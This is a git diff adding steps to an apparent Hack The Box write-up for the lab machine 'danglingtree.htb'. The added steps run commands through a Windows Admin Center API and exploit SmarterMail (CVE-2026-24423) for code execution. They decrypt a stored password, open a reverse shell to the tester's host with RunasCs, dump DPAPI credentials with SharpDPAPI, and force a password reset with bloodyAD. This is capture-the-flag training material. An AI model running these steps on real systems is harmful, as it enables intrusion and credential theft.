@@ -1,5 +1,7 @@
 # danglingtree.htb
 
+> <img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 13.51.10 (1).png" alt="" data-size="original">
+>
 > **OS:** Windows\
 > **Difficulty:** Medium\
 > **IP:** `10.10.x.x`\
@@ -115,9 +117,146 @@ When opening the .PDF file, we find credentials of the user anderson.w and can c
 
 #### 2.2 Exploitation
 
+> port 6600
 
+After retrieving the credentials for the AD user anderson.w, I noticed that port 6600 was running a version of Windows Admin Center. I tried logging in to the application, and this worked successfully.
+
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 11.57.17.png" alt=""><figcaption></figcaption></figure>
+
+After that, once you click on the dc gateway property, a powershell command is ran from your browser to the underlying server. The endpoint that is invoked is: `/api/services/WinREST/PowerShell/nodes/dc/invokeCommand`
+
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 14.35.43.png" alt=""><figcaption></figcaption></figure>
+
+In this case the endpoint was invoked, but I altered the payload to run a harmless test command instead. As you can see on the right, I am executing a shell command as the user `anderson.w`.
+
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 11.59.11.png" alt=""><figcaption></figcaption></figure>
+
+In the follow-up steps I created a reverse shell utilizing fahrj reverse SSH and connected using SSH.&#x20;
+
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 12.05.12.png" alt=""><figcaption></figcaption></figure>
+
+I then enumerated the services listening on localhost. Port 17017 in particular looked interesting.
+
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 12.06.28.png" alt=""><figcaption></figcaption></figure>
+
+Port 17017 was then forwarded to my localhost, and after opening at `http://127.0.0.1:17017`  the smartermail application was then found.
+
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 12.08.15.png" alt=""><figcaption></figcaption></figure>
+
+After some research I found a recent CVE for it (CVE-2026-24423) which provides a critical unauthenticated remote code execution (RCE) vulnerability in SmarterTools SmarterMail versions prior to build 9511. \
+\
+[https://github.com/CyberAlp0/SmarterMail-CVE-2026-24423](https://github.com/CyberAlp0/SmarterMail-CVE-2026-24423)
+
+^ POC
+
+**CVE-2026-24423**
+
+{% file src="../../.gitbook/assets/MalHub.py" %}
+
+^ POC file
+
+LHOST is then set to your VPN IP address, and a port is used to serve the fake "smarterhub" instance. This results in remote code execution, giving access to the user `svc_mail`.
+
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 12.12.46.png" alt=""><figcaption></figcaption></figure>
+
+Once code execution is achieved, it is necessary to collect two files. File 1 is `SmarterMail.Standard.dll`; the second is the `settings.json` of the user account noah.b.
+
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 13.51.10.png" alt=""><figcaption></figcaption></figure>
+
+in the settings.json file of the user `noah.b`, the encrypted password can be found
+
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 13.52.59.png" alt=""><figcaption></figcaption></figure>
+
+In order to decrypt this (this is a 3DES encryption method) we utilize `dnspy` to read out the&#x20;
+
+<figure><img src="../../.gitbook/assets/screenshot_DES.png" alt=""><figcaption></figcaption></figure>
+
+<...>
+
+```powershell
+PS C:\Users\commando\desktop\HTB_DANGLINGTREE > python3 -c 'print(bytes([180, 63, 132, 209, 16, 180, 233, 145]).hex())'
+b43f84d110b4e991
+Commando VM 06/27/2026 08:58:41
+PS C:\Users\commando\desktop\HTB_DANGLINGTREE > python3 -c 'print(bytes([ 1, 216, 174, 230, 73, 173, 146, 39]).hex())'
+01d8aee649ad9227
+```
+
+
+
+<...>
+
+{% embed url="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)DES_Decrypt(%7B'option':'Hex','string':'b43f84d110b4e991'%7D,%7B'option':'Hex','string':'01d8aee649ad9227'%7D,'CBC','Raw','Raw')&input=NjZlN3BwTE9CRjdVZHpEdjd6SzZNSjFybXlVYjFDYnk&oeol=FF" %}
 
 ***
+
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 13.57.13.png" alt=""><figcaption></figcaption></figure>
+
+
+
+> as svc\_mail
+
+```bash
+# run as the user svc_mail and get a reverse shell as the user noah.b
+.\RunasCs.exe noah.b RiverDragon#Storm25 "cmd /c C:\\users\\public.\\ssh-amd-x64.exe -b 8891 -p 5000 10.10.14.195"
+```
+
+Once you get a shell, list your credentials:
+
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 14.15.11.png" alt=""><figcaption></figcaption></figure>
+
+And utilize sharpdpapi.exe to retrieve the stored credentials
+
+```bash
+C:\Users\Public>sharpdpapi.exe credentials /password:"RiverDragon#Storm25"           
+
+[*] Action: User DPAPI Credential Triage
+[*] Will decrypt user masterkeys with password: RiverDragon#Storm25
+[*] Found MasterKey : C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\dae83966-a807-4a29-8173-bb370729254a
+[*] Found MasterKey : C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f53fcaba-f057-48e8-8f92-0180d274bf0f
+
+[*] User master key cache:
+{dae83966-a807-4a29-8173-bb370729254a}:F7EA2D586E2C84EB9BCE15A2643D1A077A88AF55
+{f53fcaba-f057-48e8-8f92-0180d274bf0f}:9979EAB03C0DF45C93ED2D50DB01EC6A6835B818
+
+[*] Triaging Credentials for current user
+
+Folder       : C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\
+  CredFile           : 57FFB67D684C67F09E7153B9C7CC3940
+    guidMasterKey    : {f53fcaba-f057-48e8-8f92-0180d274bf0f}
+    size             : 490
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description      : Enterprise Credential Data
+    LastWritten      : 3/27/2026 3:03:38 PM
+    TargetName       : Domain:target=PC01.danglingtree.htb
+    TargetAlias      :
+    Comment          :
+    UserName         : alex.o
+    Credential       : SunsetMountainPeak@2025 # <-- password of alex.o
+```
+
+
+
+<...>
+
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 14.18.24.png" alt=""><figcaption></figcaption></figure>
+
+<...>
+
+```bash
+# force change the password of the user jake.h to testTEST12!@
+bloodyAD --host '10.129.68.2' -d 'danglingtree.htb' -u 'alex.o' -p 'SunsetMountainPeak@2025' set password 'jake.h' 'testTEST12!@'
+```
+
+
+
+<...>
+
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 14.31.13.png" alt=""><figcaption></figcaption></figure>
+
+In addition, I can login with RDP a retrieve the `user.txt` flag
+
+
 
 ### 3. Privilege Escalation
 
